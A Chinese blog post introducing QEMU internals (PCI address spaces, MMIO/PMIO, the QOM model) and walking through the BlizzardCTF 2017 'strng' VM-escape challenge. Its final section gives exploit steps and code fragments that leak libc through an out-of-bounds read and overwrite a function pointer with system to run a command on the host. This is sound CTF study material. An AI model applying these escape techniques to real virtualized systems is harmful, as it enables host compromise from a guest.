---
layout: post
title:  "qemu知识入门"
categories: pwn
tags: 虚拟化
excerpt: qemu知识入门
mathjax: true
---

* content
{:toc}

### Overview
qemu 是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备，出问题的地方主要在设备模拟中

### 基础知识 

1. 虚拟机内存结构 
qemu使用mmap申请出虚拟机大小的内存，用于给虚拟机当作物理内存。


[下载地址](https://github.com/rcvalle/blizzardctf2017/releases)

launch.sh
```
./qemu-system-x86_64 \
    -m 1G \
    -device strng \
    -hda my-disk.img \
    -hdb my-seed.img \
    -nographic \
    -L pc-bios/ \
    -enable-kvm \
    -device e1000,netdev=net0 \
    -netdev user,id=net0,hostfwd=tcp::5555-:22
```
虚拟机是一个 Ubuntu Server 14.04 LTS ，用户名是 ubuntu ，密码是 passw0rd 。它把22端口重定向到了宿主机的5555端口，可以使用 ssh ubuntu@127.0.0.1 -p 5555 登进去。
如果出现 `Could not access KVM kernel module: No such file or directory` 就是没有开启虚拟化选项



虚拟机启动后 查看qemu的内存 
`cat /proc/7961/maps`
结果开始是qemu本身的三个段(data/text/rodata),后面是各种libc.so 文件，没有发现大小为0x40000000内存空间 ，此时并不知道那块被当成了物理内存 

查找地址练习失败 
执行mmu 
```
ubuntu@ubuntu:~$ sudo ./mmu
sudo: unable to resolve host ubuntu
Where am I?
Your physical address is at 0x31cb1008
```
无法调试 ，直接attach 和 qemu -gdb tcp::1234 都调试失败 ， base 地址也没有找到 


### PCI 设备地址空间 

![](res/2020-04-21-19-51-32.png)

比较关键的是其6个BAR(Base Address Registers)，BAR记录了设备所需要的地址空间的类型，基址以及其他属性
![](res/2020-04-21-19-52-34.png)

设备有两类地址空间

* memory space
    + 1-2位表示内存的类型，bit 2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M。bit3表示是否支持可预取。
    + memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。
    + 在MMIO中，内存和I/O设备共享同一个地址空间。 MMIO是应用得最为广泛的一种I/O方法，它使用相同的地址总线来处理内存和I/O设备，I/O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I/O设备的内存，用于访问内存的CPU指令也可来访问I/O设备。每个I/O设备监视CPU的地址总线，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I/O设备，CPU必须预留给I/O一个地址区域，该地址区域不能给物理内存使用。

* I/O space
    + I/O端口一般不支持预取，所以这里是29位的地址
    + port mapped I/O，这种情况下CPU需要使用专门的I/O指令如IN/OUT访问I/O端口
    + 在PMIO中，内存和I/O设备有各自的地址空间。 端口映射I/O通常使用一种特殊的CPU指令，专门执行I/O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读/写1,2,4个字节（例如：outb, outw, outl）到IO设备上。I/O设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在CPU物理接口上增加一个I/O引脚，要么增加一条专用的I/O总线。由于I/O地址空间与内存地址空间是隔离的，所以有时将PMIO称为被隔离的IO(Isolated I/O)。

### 查看PCI设备

lspci 
```
ubuntu@ubuntu:~$ lspci
00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)
00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)
```
pci设备的寻址是由总线、设备以及功能构成，xx:yy:z的格式为总线:设备:功能的格式

```
ubuntu@ubuntu:~$ lspci -t -v
-[0000:00]-+-00.0  Intel Corporation 440FX - 82441FX PMC [Natoma]
           +-01.0  Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
           +-01.1  Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
           +-01.3  Intel Corporation 82371AB/EB/MB PIIX4 ACPI
           +-02.0  Device 1234:1111
           +-03.0  Device 1234:11e9
           \-04.0  Intel Corporation 82540EM Gigabit Ethernet Controller
```

其中[0000]表示pci的域， PCI域最多可以承载256条总线。 每条总线最多可以有32个设备，每个设备最多可以有8个功能。

总线-> 设备 -> 功能 

PCI 设备通过VendorIDs、DeviceIDs、以及Class Codes字段区分：
```
ubuntu@ubuntu:~$ lspci -v -m -s 02.0
Device: 00:02.0
Class:  VGA compatible controller
Vendor: Vendor 1234
Device: Device 1111
SVendor:        Red Hat, Inc
SDevice:        Device 1100
Rev:    02

```
查看设备内存空间

```
ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
        Subsystem: Red Hat, Inc Device 1100
        Physical Slot: 3
        Flags: fast devsel
        Memory at febf1000 (32-bit, non-prefetchable) [size=256] ( BAR0 MMIO 地址febf1000)
        I/O ports at c050 [size=8] ( BAR1 PMIO 端口地址 c050)
00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00
10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00
20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11
30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

```
ubuntu@ubuntu:~$ ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/
total 0
drwxr-xr-x  3 root root    0 Apr 21 11:42 .
drwxr-xr-x 11 root root    0 Apr 21 11:42 ..
-rw-r--r--  1 root root 4096 Apr 21 12:11 broken_parity_status
-r--r--r--  1 root root 4096 Apr 21 12:03 class
-rw-r--r--  1 root root  256 Apr 21 12:03 config
-r--r--r--  1 root root 4096 Apr 21 12:11 consistent_dma_mask_bits
-rw-r--r--  1 root root 4096 Apr 21 12:11 d3cold_allowed
-r--r--r--  1 root root 4096 Apr 21 12:03 device
-r--r--r--  1 root root 4096 Apr 21 12:11 dma_mask_bits
-rw-r--r--  1 root root 4096 Apr 21 12:11 enable
lrwxrwxrwx  1 root root    0 Apr 21 12:11 firmware_node -> ../../LNXSYSTM:00/device:00/PNP0A03:00/device:06
-r--r--r--  1 root root 4096 Apr 21 11:42 irq
-r--r--r--  1 root root 4096 Apr 21 12:11 local_cpulist
-r--r--r--  1 root root 4096 Apr 21 12:11 local_cpus
-r--r--r--  1 root root 4096 Apr 21 12:11 modalias
-rw-r--r--  1 root root 4096 Apr 21 12:11 msi_bus
drwxr-xr-x  2 root root    0 Apr 21 12:11 power
--w--w----  1 root root 4096 Apr 21 12:11 remove
--w--w----  1 root root 4096 Apr 21 12:11 rescan
-r--r--r--  1 root root 4096 Apr 21 12:03 resource
-rw-------  1 root root  256 Apr 21 12:11 resource0
-rw-------  1 root root    8 Apr 21 12:11 resource1
lrwxrwxrwx  1 root root    0 Apr 21 12:11 subsystem -> ../../../bus/pci
-r--r--r--  1 root root 4096 Apr 21 12:11 subsystem_device
-r--r--r--  1 root root 4096 Apr 21 12:11 subsystem_vendor
-rw-r--r--  1 root root 4096 Apr 21 11:42 uevent
-r--r--r--  1 root root 4096 Apr 21 12:03 vendor
```


```
ubuntu@ubuntu:~$ sudo cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource
sudo: unable to resolve host ubuntu
0x00000000febf1000 0x00000000febf10ff 0x0000000000040200
0x000000000000c050 0x000000000000c057 0x0000000000040101
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
```

每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识位（flags）

### qemu 访问I/O 空间

#### 访问mmio
内核模块
```
#include <asm/io.h>
#include <linux/ioport.h>

long addr=ioremap(ioaddr,iomemsize);
readb(addr);
readw(addr);
readl(addr);
readq(addr);//qwords=8 btyes

writeb(val,addr);
writew(val,addr);
writel(val,addr);
writeq(val,addr);
iounmap(addr);
```
用户态映射resource 空间访问

```
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>


unsigned char* mmio_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

int main(int argc, char *argv[])
{

    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);

    mmio_read(0x128);
    mmio_write(0x128, 1337);

}
```
#### 访问PMIO
内核模块
```
#include <asm/io.h> 
#include <linux/ioport.h>

inb(port);  //读取一字节
inw(port);  //读取两字节
inl(port);  //读取四字节

outb(val,port); //写一字节
outw(val,port); //写两字节
outl(val,port); //写四字节
```

用户空间访问,先申请访问端口

```
#include <sys/io.h >

iopl(3); 
inb(port); 
inw(port); 
inl(port);

outb(val,port); 
outw(val,port); 
outl(val,port);
```

### QOM 编程模型

QOM编程模型
QEMU提供了一套面向对象编程的模型——QOM（QEMU Object Module），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。

由于qemu模拟设备以及CPU等，既有相应的共性又有自己的特性，因此使用面向对象来实现相应的程序是非常高效的，可以像理解C++或其它面向对象语言来理解QOM。

有几个比较关键的结构体，TypeInfo、TypeImpl、ObjectClass以及Object。其中ObjectClass、Object、TypeInfo定义在include/qom/object.h中，TypeImpl定义在qom/object.c中。

TypeInfo是用户用来定义一个Type的数据结构，用户定义了一个TypeInfo，然后调用type_register(TypeInfo )或者type_register_static(TypeInfo )函数，就会生成相应的TypeImpl实例，将这个TypeInfo注册到全局的TypeImpl的hash表中。

struct TypeInfo
{
    const char *name;
    const char *parent;
    size_t instance_size;
    void (*instance_init)(Object *obj);
    void (*instance_post_init)(Object *obj);
    void (*instance_finalize)(Object *obj);
    bool abstract;
    size_t class_size;
    void (*class_init)(ObjectClass *klass, void *data);
    void (*class_base_init)(ObjectClass *klass, void *data);
    void (*class_finalize)(ObjectClass *klass, void *data);
    void *class_data;
    InterfaceInfo *interfaces;
};
TypeImpl的属性与TypeInfo的属性对应，实际上qemu就是通过用户提供的TypeInfo创建的TypeImpl的对象。

如下面定义的pci_test_dev：

static const TypeInfo pci_testdev_info = {
        .name          = TYPE_PCI_TEST_DEV,
        .parent        = TYPE_PCI_DEVICE,
        .instance_size = sizeof(PCITestDevState),
        .class_init    = pci_testdev_class_init,
};
TypeImpl *type_register_static(const TypeInfo *info)
{
    return type_register(info);
}
TypeImpl *type_register(const TypeInfo *info)
{
    assert(info->parent);
    return type_register_internal(info);
}
static TypeImpl *type_register_internal(const TypeInfo *info)
{
    TypeImpl *ti;
    ti = type_new(info);
    type_table_add(ti);
    return ti;
}
当所有qemu总线、设备等的type_register_static执行完成后，即它们的TypeImpl实例创建成功后，qemu就会在type_initialize函数中去实例化其对应的ObjectClasses。

每个type都有一个相应的ObjectClass所对应，其中ObjectClass是所有类的基类

struct ObjectClass
{
    /*< private >*/
    Type type;  
    GSList *interfaces;
    const char *object_cast_cache[OBJECT_CLASS_CAST_CACHE];
    const char *class_cast_cache[OBJECT_CLASS_CAST_CACHE];
    ObjectUnparent *unparent;
    GHashTable *properties;
};
用户可以定义自己的类，继承相应类即可：

/* include/qom/object.h */
typedef struct TypeImpl *Type;
typedef struct ObjectClass ObjectClass;
struct ObjectClass
{
        /*< private >*/
        Type type;       /* points to the current Type's instance */
        ...
/* include/hw/qdev-core.h */
typedef struct DeviceClass {
        /*< private >*/
        ObjectClass parent_class;
        /*< public >*/
        ...
/* include/hw/pci/pci.h */
typedef struct PCIDeviceClass {
        DeviceClass parent_class;
        ...
可以看到类的定义中父类都在第一个字段，使得可以父类与子类直接实现转换。一个类初始化时会先初始化它的父类，父类初始化完成后，会将相应的字段拷贝至子类同时将子类其余字段赋值为0，再进一步赋值。同时也会继承父类相应的虚函数指针，当所有的父类都初始化结束后，TypeInfo::class_init就会调用以实现虚函数的初始化，如下例的pci_testdev_class_init所示：

static void pci_testdev_class_init(ObjectClass *klass, void *data)
{
        DeviceClass *dc = DEVICE_CLASS(klass);
        PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);
        k->init = pci_testdev_init;
        k->exit = pci_testdev_uninit;
        ...
        dc->desc = "PCI Test Device";
        ...
}
最后一个是Object对象：

struct Object
{
    /*< private >*/
    ObjectClass *class;
    ObjectFree *free;
    GHashTable *properties;
    uint32_t ref;
    Object *parent;
};
Object对象为何物？Type以及ObjectClass只是一个类型，而不是具体的设备。TypeInfo结构体中有两个函数指针：instance_init以及class_init。class_init是负责初始化ObjectClass结构体的，instance_init则是负责初始化具体Object结构体的。

the Object constructor and destructor functions (registered by the respective Objectclass constructors) will now only get called if the corresponding PCI device's -device option was specified on the QEMU command line (unless, probably, it is a default PCI device for the machine). 
Object类的构造函数与析构函数（在Objectclass构造函数中注册的）只有在命令中-device指定加载该设备后才会调用（或者它是该系统的默认加载PCI设备）。
Object示例如下所示：

/* include/qom/object.h */
typedef struct Object Object;
struct Object
{
        /*< private >*/
        ObjectClass *class; /* points to the Type's ObjectClass instance */
        ...
/* include/qemu/typedefs.h */
typedef struct DeviceState DeviceState;
typedef struct PCIDevice PCIDevice;
/* include/hw/qdev-core.h */
struct DeviceState {
        /*< private >*/
        Object parent_obj;
        /*< public >*/
        ...
/* include/hw/pci/pci.h */
struct PCIDevice {
        DeviceState qdev;
        ...
struct YourDeviceState{
        PCIDevice pdev;
        ...
（QOM will use instace_size as the size to allocate a Device Object, and then it invokes the instance_init ）

QOM会为设备Object分配instace_size大小的空间，然后调用instance_init函数（在Objectclass的class_init函数中定义）：

static int pci_testdev_init(PCIDevice *pci_dev)
{
        PCITestDevState *d = PCI_TEST_DEV(pci_dev);
        ...
最后便是PCI的内存空间了，qemu使用MemoryRegion来表示内存空间，在include/exec/memory.h中定义。使用MemoryRegionOps结构体来对内存的操作进行表示，如PMIO或MMIO。对每个PMIO或MMIO操作都需要相应的MemoryRegionOps结构体，该结构体包含相应的read/write回调函数。

static const MemoryRegionOps pci_testdev_mmio_ops = {
        .read = pci_testdev_read,
        .write = pci_testdev_mmio_write,
        .endianness = DEVICE_LITTLE_ENDIAN,
        .impl = {
                .min_access_size = 1,
                .max_access_size = 1,
        },
};

static const MemoryRegionOps pci_testdev_pio_ops = {
        .read = pci_testdev_read,
        .write = pci_testdev_pio_write,
        .endianness = DEVICE_LITTLE_ENDIAN,
        .impl = {
                .min_access_size = 1,
                .max_access_size = 1,
        },
};
首先使用memory_region_init_io函数初始化内存空间（MemoryRegion结构体），记录空间大小，注册相应的读写函数等；然后调用pci_register_bar来注册BAR等信息。需要指出的是无论是MMIO还是PMIO，其所对应的空间需要显示的指出（即静态声明或者是动态分配），因为memory_region_init_io只是记录空间大小而并不分配。

/* hw/misc/pci-testdev.c */
#define IOTEST_IOSIZE 128
#define IOTEST_MEMSIZE 2048

typedef struct PCITestDevState {
        /*< private >*/
        PCIDevice parent_obj;
        /*< public >*/

        MemoryRegion mmio;
        MemoryRegion portio;
        IOTest *tests;
        int current;
} PCITestDevState;

static int pci_testdev_init(PCIDevice *pci_dev)
{
        PCITestDevState *d = PCI_TEST_DEV(pci_dev);
        ...
        memory_region_init_io(&d->mmio, OBJECT(d), &pci_testdev_mmio_ops, d,
                                                    "pci-testdev-mmio", IOTEST_MEMSIZE * 2); 
        memory_region_init_io(&d->portio, OBJECT(d), &pci_testdev_pio_ops, d,
                                                    "pci-testdev-portio", IOTEST_IOSIZE * 2); 
        pci_register_bar(pci_dev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &d->mmio);
        pci_register_bar(pci_dev, 1, PCI_BASE_ADDRESS_SPACE_IO, &d->portio);

到此基本结束了，最后可以去看strng的实现去看一个设备具体是怎么实现的，它的相应的数据结构是怎么写的。


创建QOM的过程

定义TypeInfo结构 -> type_register(TypeInfo ) -> 生成TypeImpl 实例

```
struct TypeInfo
{
    const char *name;
    const char *parent;
    size_t instance_size;
    void (*instance_init)(Object *obj);
    void (*instance_post_init)(Object *obj);
    void (*instance_finalize)(Object *obj);
    bool abstract;
    size_t class_size;
    void (*class_init)(ObjectClass *klass, void *data);
    void (*class_base_init)(ObjectClass *klass, void *data);
    void (*class_finalize)(ObjectClass *klass, void *data);
    void *class_data;
    InterfaceInfo *interfaces;
};
```
当所有设备的TypeImpl实例创建成功后，qemu就会在type_initialize 中实例化ObjectClass

TypeInfo、TypeImpl、ObjectClass以及Object



### strng

查看结构体 STRNGState 包含regs数组 64*4 =256
```
00000000 STRNGState      struc ; (sizeof=0xC10, align=0x10, copyof_3815)
00000000 pdev            PCIDevice_0 ?
000008F0 mmio            MemoryRegion_0 ?
000009F0 pmio            MemoryRegion_0 ?
00000AF0 addr            dd ?
00000AF4 regs            dd 64 dup(?)
00000BF4                 db ? ; undefined
00000BF5                 db ? ; undefined
00000BF6                 db ? ; undefined
00000BF7                 db ? ; undefined
00000BF8 srand           dq ?                    ; offset
00000C00 rand            dq ?                    ; offset
00000C08 rand_r          dq ?                    ; offset
00000C10 STRNGState      ends
```

逆向搜索strng  
pci_strng_register_types函数 中是注册TypeInfo的操作，参数就是TypeInfo
```
void __cdecl pci_strng_register_types()
{
  __readfsqword(0x28u);
  __readfsqword(0x28u);
  type_register_static(&strng_info_25910);
}
```
```
.data.rel.ro:0000000000A4A1A0 strng_info_25910 dq offset aStrng        ; name
.data.rel.ro:0000000000A4A1A0                                         ; DATA XREF: pci_strng_register_types+24↑o
.data.rel.ro:0000000000A4A1A0                 dq offset aVirtioPciDevic+7; parent ; "strng" ...
.data.rel.ro:0000000000A4A1A0                 dq 0C10h                ; instance_size
.data.rel.ro:0000000000A4A1A0                 dq offset strng_instance_init; instance_init
.data.rel.ro:0000000000A4A1A0                 dq 0                    ; instance_post_init
.data.rel.ro:0000000000A4A1A0                 dq 0                    ; instance_finalize
.data.rel.ro:0000000000A4A1A0                 db 0                    ; abstract
.data.rel.ro:0000000000A4A1A0                 db 7 dup(0)
.data.rel.ro:0000000000A4A1A0                 dq 0                    ; class_size
.data.rel.ro:0000000000A4A1A0                 dq offset strng_class_init; class_init
.data.rel.ro:0000000000A4A1A0                 dq 0                    ; class_base_init
.data.rel.ro:0000000000A4A1A0                 dq 0                    ; class_finalize
.data.rel.ro:0000000000A4A1A0                 dq 0                    ; class_data
.data.rel.ro:0000000000A4A1A0                 dq 0                    ; interfaces
.data.rel.ro:0000000000A4A208                 align 20h
```
发现 strng_instance_init 和 strng_class_init

在伪代码窗口选中 k ，右键convert to struct 设置为PCIDeviceClass
```
void __fastcall strng_class_init(ObjectClass *a1, void *data)
{
  PCIDeviceClass *k; // rax

  k = (PCIDeviceClass *)object_class_dynamic_cast_assert(
                          a1,
                          "pci-device",
                          "/home/rcvalle/qemu/hw/misc/strng.c",
                          154,
                          "strng_class_init");
  k->device_id = 4585;
  k->revision = 16;
  k->realize = (void (*)(PCIDevice_0 *, Error_0 **))pci_strng_realize;
  k->class_id = 255;
  k->vendor_id = 4660;
}
```
设置其 device_id 为 0x11e9 ， vendor_id 为 0x1234

ubuntu@ubuntu:~$ lspci -v -s 00:03.0
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
        Subsystem: Red Hat, Inc Device 1100
        Physical Slot: 3
        Flags: fast devsel
        Memory at febf1000 (32-bit, non-prefetchable) [size=256]
        I/O ports at c050 [size=8]



pci_strng_realize函数注册了MMIO和PMIO空间，包括mmio的操作结构 strng_mmio_ops 及其大小 256 ；pmio的操作结构体 strng_pmio_ops 及其大小8

void __fastcall pci_strng_realize(PCIDevice_0 *pdev, Error_0 **errp)
{
  unsigned __int64 v2; // ST08_8

  v2 = __readfsqword(0x28u);
  memory_region_init_io(
    (MemoryRegion_0 *)&pdev[1],
    &pdev->qdev.parent_obj,
    &strng_mmio_ops,
    pdev,
    "strng-mmio",
    0x100uLL);
  pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&pdev[1]);
  memory_region_init_io(
    (MemoryRegion_0 *)&pdev[1].io_regions[0].size,
    &pdev->qdev.parent_obj,
    &strng_pmio_ops,
    pdev,
    "strng-pmio",
    8uLL);
  if ( __readfsqword(0x28u) == v2 )
    pci_register_bar(pdev, 1, 1u, (MemoryRegion_0 *)&pdev[1].io_regions[0].size);
}

strng_mmio_ops 中有访问mmio对应的 strng_mmio_read 以及 strng_mmio_write ； strng_pmio_ops 中有访问pmio对应的 strng_pmio_read 以及 strng_pmio_write

```
void __fastcall strng_instance_init(Object *obj)
{
  STRNGState *v1; // rax

  v1 = object_dynamic_cast_assert(obj, "strng", "/home/rcvalle/qemu/hw/misc/strng.c", 145, "strng_instance_init");
  v1->srand = &srand;
  v1->rand = &rand;
  v1->rand_r = &rand_r;
}
```
看 strng_instance_init 函数，该函数则是为 strng Object赋值了相应的函数指针值 srand 、 rand 以及 rand_r

### MMIO

```
uint64_t __fastcall strng_mmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax

  result = -1LL;
  if ( size == 4 && !(addr & 3) )
    result = opaque->regs[addr >> 2];
  return result;
}
```
设置 *opaque的结构体为STRNGState，函数功能为输入`addr`返回`regs[addr>>2]` 

```
void __fastcall strng_mmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
...
  v7 = __readfsqword(0x28u);
  if ( size == 4 && !(addr & 3) ) 
  {
    v4 = addr >> 2;
    if ( v4 == 1 )
    {
      opaque->regs[1] = (opaque->rand)(opaque, v4, val);
    }
    else if ( v4 < 1 )
    {
      if ( __readfsqword(0x28u) == v7 )
        (opaque->srand)(val);
    }
    else
    {
      if ( v4 == 3 )
      {
        v5 = val;
        v6 = (opaque->rand_r)(&opaque->regs[2]);
        LODWORD(val) = v5;
        opaque->regs[3] = v6;
      }
      opaque->regs[v4] = val;
    }
  }
}
```
size =4 ,addr 后两位为0 

当 size 等于4时，将 addr 右移两位得到寄存器的索引 i ，并提供4个功能：

当 i 为0时，调用 srand 函数但并不给赋值给内存。
当 i 为1时，调用rand得到随机数并赋值给 regs[1] 。
当 i 为3时，调用 rand_r 函数，并使用 regs[2] 的地址作为参数，并最后将返回值赋值给 regs[3] 
最后无论i为何值 都将传入的 val 值赋值给 regs[i] 。

隐含的限制条件： 传入的addr不能超出mmio的空间大小256 

看起来似乎是 addr 可以由我们控制，可以使用 addr 来越界读写 regs 数组。即如果传入的addr大于regs的边界，那么我们就可以读写到后面的函数指针了。但是事实上是不可以的，前面已经知道了 mmio 空间大小为256，我们传入的addr是不能大于 mmio 的大小；因为pci设备内部会进行检查，而刚好 regs 的大小为256，所以我们无法通过 mmio 进行越界读写

### PMIO
PMIO 有8个端口，端口起始地址为 0xc050

strng_pmio_read
```
uint64_t __fastcall strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax
  uint32_t v4; // edx

  result = -1LL;
  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        v4 = opaque->addr;
        if ( !(v4 & 3) )
          result = opaque->regs[v4 >> 2];
      }
    }
    else
    {
      result = opaque->addr;
    }
  }
  return result;
}
```
如果addr=4 && opaque->addr低2位为0，返回opaque->regs[opaque->addr >> 2]
如果addr=0 直接返回opaque->addr


strng_pmio_write
```
void __fastcall strng_pmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  uint32_t v4; // eax
  __int64 v5; // rax
  unsigned __int64 v6; // [rsp+8h] [rbp-10h]

  v6 = __readfsqword(0x28u);
  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        v4 = opaque->addr;
        if ( !(v4 & 3) )
        {
          v5 = v4 >> 2;
          if ( v5 == 1 )
          {
            opaque->regs[1] = (opaque->rand)(opaque, 4LL, val);
          }
          else if ( v5 < 1 )
          {
            if ( __readfsqword(0x28u) == v6 )
              (opaque->srand)(val);
          }
          else if ( v5 == 3 )
          {
            opaque->regs[3] = (opaque->rand_r)(&opaque->regs[2], 4LL, val);
          }
          else
          {
            opaque->regs[v5] = val;
          }
        }
      }
    }
    else
    {
      opaque->addr = val;
    }
  }
}
```

当 size 等于4时，以传入的端口地址为判断提供4个功能：

当端口地址为0时，直接将传入的 val 赋值给 opaque->addr 。

当端口地址不为0时，将 opaque->addr 右移两位得到索引 i ，分为三个功能：

i 为0时，执行 srand ，返回值不存储。
i 为1时，执行 rand 并将返回结果存储到 regs[1] 中。
i 为3时，调用 rand_r 并将 regs[2] 作为第一个参数，返回值存储到 regs[3] 中。
否则直接将 val 存储到 regs[i] 中。


strng_pmio_read 输出opaque->regs[opaque->addr >> 2] ， 索引是opaque->addr>>2 而在strng_pmio_write函数中opaque->addr当addr为0时直接可控，导致任意地址读。

strng_pmio_write 中i不是0/1/3 时，直接赋值opaque->regs[i] = val ， 此时i= opaque->addr >>2 ,opaque->addr 可控造成越界写。

### 编程访问PMIO
可以使用 IN(读) 和 OUT(写) 去读写相应字节的1、2、4字节数据（outb/inb, outw/inw, outl/inl），函数的头文件为 <sys/io.h> ，函数的具体用法可以使用 man 手册查看。

还需要注意的是要访问相应的端口需要一定的权限，程序应使用root权限运行。对于 0x000-0x3ff 之间的端口，使用 ioperm(from, num, turn_on) 即可；对于 0x3ff 以上的端口，则该调用执行 iopl(3) 函数去允许访问所有的端口（可使用 man ioperm 和 man iopl 去查看函数）


```
uint32_t pmio_base=0xc050;

uint32_t pmio_write(uint32_t addr, uint32_t value)
{
    outl(value,addr);
}

uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)inl(addr);
}

int main(int argc, char *argv[])
{

    // Open and map I/O memory for the strng device
    if (iopl(3) !=0 )
        die("I/O permission is not enough");
        pmio_write(pmio_base+0,0);
    pmio_write(pmio_base+4,1);
 
}
```


### exploit 
整体思路：
1. 将"cat /root/flag" 写入regs[2]中作为备用参数 ，`map(hex, unpack_many("cat /root/flag  "))`
2. 构造越界读，读取函数地址，算出system函数地址
3. 越界写STRNGState 中的rand_r 函数为system
4. 构造调用rand_r(regs[2]) ,让opaque->addr>>2=3 

越界读：
先调用pmio_write 让 addr=0 ，opaque->addr = val ，先设置想读的地址,在用pmio_read() 当addr=4 时返回regs[opaddr>>2]

uint32_t oobread(uint32_t opaddr){
    pmio_write(pmio_base+0,opaddr);
    pmio_read(pmio_base+4);
}

越界写：
同样先设置opaque->addr = val，再addr=4,把val写入到 regs[opaddr>>2]中
uint32_t oobwrite(uint32_t opaddr){
    pmio_write(pmio_base+0,opaddr);
    pmio_write(pmio_base+4,val);
}

问题，参数中为什么没有指定size 

编译Makefile
```
ALL:
        cc -m32 -O0 -static -o exp exp.c
```

调试
1. 启动qemu 进入系统，编译并拷贝exp到系统中`scp -P5555 ./exp ubuntu@127.0.0.1:/home/ubuntu`
2. `ps -aux | grep qemu` 过滤出qemu进程
3. 编辑文件cmdline 
```
aslr off
b *0x00005591f4b324b0
```
aslr off 可以关闭随机化 ，即可在固定地址下断点
4. 开始调试
```
gdb ./qemu-system-x86_64 -q
source cmdline
attach qemu_pid
```
5. 执行exp 


##### 目标1: 断点`b *strng_mmio_write` 写入 "cat /root/flag" 是否成功

b *strng_mmio_write

 ► 0x557bb42de3e0 <strng_mmio_write>       push   rbp
断点触发后 根据函数`void __fastcall strng_mmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)`
查看rdi 为参数1 地址 0x557bb64007a0，先确定regs在便宜0xAF4的位置

pwndbg> telescope 0x557bb64007a0+0xaf4
00:0000│   0x557bb6401294 ◂— 0x0
01:0008│   0x557bb640129c ◂— 'cat /root/flag'
02:0010│   0x557bb64012a4 ◂— 0x67616c662f74 /* 't/flag' */

##### 目标2：leak libc

使用oob_read 确定读取函数的偏移，pmio_read 返回 opaque->regs[opaque->addr >> 2], 
srand_offset = 0xBF8 , regs = 0xAF4 , 因此opaque->addr >>2 = (0xbf8-0xaf4)/4 , opaque->addr = 0x104
但是每次只能读出4个字节，第二次用0x108读出后半部分
```
   uint64_t srand_addr1 = oobread(0x104);
   uint64_t srand_addr2 = oobread(0x108);
   uint64_t srand_addr = srand_addr1 + srand_addr2<<32;
   printf("leaking srandom addr: 0x%llx\n",srandom_addr);
```

随后覆盖rand_r 指针，只覆盖低4字节即可。
计算偏移 以0x104为srand的低4字节算，rand_r 与其相差0x10 ,则偏移为0x114

tips: 有一个小坑在两个地址相加时，移位操作要加括号，否则地址不对
`uint64_t srand_addr = srand_addr1 + (srand_addr2<<32);`

最终运行结果，成功读取到了宿主机上的flag文件内容
```
ubuntu@ubuntu:~$ sudo ./exp
sudo: unable to resolve host ubuntu
mmio_mem @ 0xb7783000
cat: -: Resource temporarily unavailable
leaking srandom addr: 0x7f427ce2e8d0
leaking srandom addr1: 0x7ce2e8d0
leaking srandom addr2: 0x7f42
leaking libc addr: 0x7f427cdf4000
THIS{qemu_flag}
```

### 参考

https://xz.aliyun.com/t/6562
[DOM编程模型](https://blog.csdn.net/u011364612/article/details/53485856)
https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html
http://www.phrack.org/papers/vm-escape-qemu-case-study.html


